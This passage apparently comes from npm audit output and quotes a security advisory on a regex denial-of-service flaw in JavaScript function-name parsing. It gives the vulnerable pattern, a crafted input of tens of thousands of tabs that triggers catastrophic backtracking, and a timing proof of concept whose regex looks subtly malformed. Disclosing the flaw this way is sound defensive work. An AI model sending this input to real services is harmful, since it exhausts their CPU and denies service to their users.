The regex implementation in question is as follows:\n\n```js\nconst functionNameMatch = /\\s*function(?:\\s|\\s*\\/\\*[^(?:*/)]+\\*\\/\\s*)*([^\\s(/]+)/;\n```\n\nThis vulnerability can be exploited when there is an imbalance in parentheses, which results in excessive backtracking and subsequently increases the CPU load and processing time significantly. This vulnerability can be triggered using the following input:\n\n```js\n'\\t'.repeat(54773) + '\\t/function/i'\n```\n\nHere is a simple PoC code to demonstrate the issue:\n\n```js\nconst protocolre = /\\sfunction(?:\\s|\\s/*[^(?:*\\/)]+*/\\s*)*([^\\(\\/]+)/;\n\nconst startTime = Date.now();\nconst maliciousInput = '\\t'.repeat(54773) + '\\t/function/i'\n\nprotocolre.test(maliciousInput);\n\nconst endTime = Date.now();\n\nconsole.log(\"process time: \", endTime - startTime, \"ms\");\n```","url":"https://github.com/advisories/GHSA-4q6p-r6v2-jvc5"}},"muted":[],"metadata":{"vulnerabilities":{"info":0,"low":0,"moderate":0,"high":3,"critical":0},"dependencies":357,"devDependencies":1,"optionalDependencies":0,"totalDependencies":358}}
